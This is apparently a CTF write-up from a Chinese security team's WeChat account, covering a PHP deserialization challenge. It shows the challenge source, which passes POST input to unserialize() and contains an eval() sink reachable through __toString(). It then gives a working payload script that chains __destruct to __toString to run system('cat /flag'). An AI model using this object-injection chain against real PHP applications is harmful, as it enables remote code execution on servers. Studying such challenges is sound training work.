---
title: PHP反序列化__toString ()
url: https://mp.weixin.qq.com/s/uigR21AnFKDeHC5zI67lsg
source: Doonsec's feed
date: 2026-04-06
fetch_date: 2026-04-07T04:28:12.408066
---

# PHP反序列化__toString ()

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ZCjMVth9QjgKicm8j6Toa4Pta9Fr2QnWDuunOsF14ToIAW1jRRemNN8O585rbAXFuf3icGn7EegFH6ibmV15AFF73Blono8PKsR46fD2dWqeY0/0?wx_fmt=jpeg)

# PHP反序列化\_\_toString ()

原创

晨星安全团队
晨星安全团队

晨星安全团队

![]()

在小说阅读器中沉浸阅读

题目来源于青少年CTF练习平台——ez-ser

![image.png](https://mmbiz.qpic.cn/mmbiz_png/ZCjMVth9QjiaVFRQSmN9DafdzZMN22kicPgibx5AnKdvPtiansFsjrIwjxsczZg3bA5yx82COemqedrD6MUmyAgkxtBv5J3hkzJntALRCLibvD54/640?from=appmsg)

打开网页给出源码

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZCjMVth9Qjia2ibfyyDhVem6XHIx1K0lVxxw15GvaFwUwY3oW3Ml9KgQiabOhSko5Kiam7waEexcjKibaCVC8PnLicYVz6s2bAdG12ccibrAboblMY/640?wx_fmt=png)

class GIT {

    public $username;

    public $password;

    public function \_\_construct(){

        $this -> username = 'guest';

        $this -> password = 'welcom to GITCTF!';

    }

//如果用户名为 ‘ZeroZone’；则输出密码；否则输出提示信息

    public function \_\_destruct(){

        if($this -> username == 'ZeroZone'){

            echo $this -> password;

        }

        else{

            echo 'ZeroZone Lab new bee !';

        }

    }

}

class ZeroZone{

    public $code;

    public function \_\_toString(){

        if(isset($this -> code)){

            eval($this -> code);

            return '';

        }

        else{

            echo "代码呢？";

            return '';

        }

    }

}

//创建一个新的GIT类实例

$data = new GIT();

if(isset ($\_POST['data'])){

    $data = unserialize($\_POST['data']);

}

让$data->username == 'ZeroZone'，并让 $data->password

由于\_\_destruct()会输出$data->password，如果能让$data->password为一个ZeroZone对象，并且触发\_\_toString()，就可以执行任意代码

<?php

class GIT {

    public $username;

    public $password;

}

class ZeroZone {

    public $code;

}

//构造恶意对象链

$zero = new ZeroZone();

$zero -> code = "system('cat /flag');";

$git = new GIT();

//触发密码输出条件

$git -> username = 'ZeroZone';

//触发\_\_toString()方法

$git -> password = $zero;

//生成payload

echo serialize($git);

?>

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZCjMVth9QjgdYuC927bJNvbyI2Xnr5rvVs6dPa9TPO3aQ9jzfdeBHx5JVCGY8eRKHcCXyJUKdDSSLVHhnaCrKRibVrzb7KmtTyGAxGObH518/640?wx_fmt=png)

**-END-**

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/Tw9nMcspHZk3JUC8heWAKneleRCqkKZy03kddtZa7UiaJoe7m4ZhNlGbliaRm8qMJ17YMCHhG1RemyRjOgYn9YOw/0?wx_fmt=png)

晨星安全团队

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/Tw9nMcspHZk3JUC8heWAKneleRCqkKZy03kddtZa7UiaJoe7m4ZhNlGbliaRm8qMJ17YMCHhG1RemyRjOgYn9YOw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过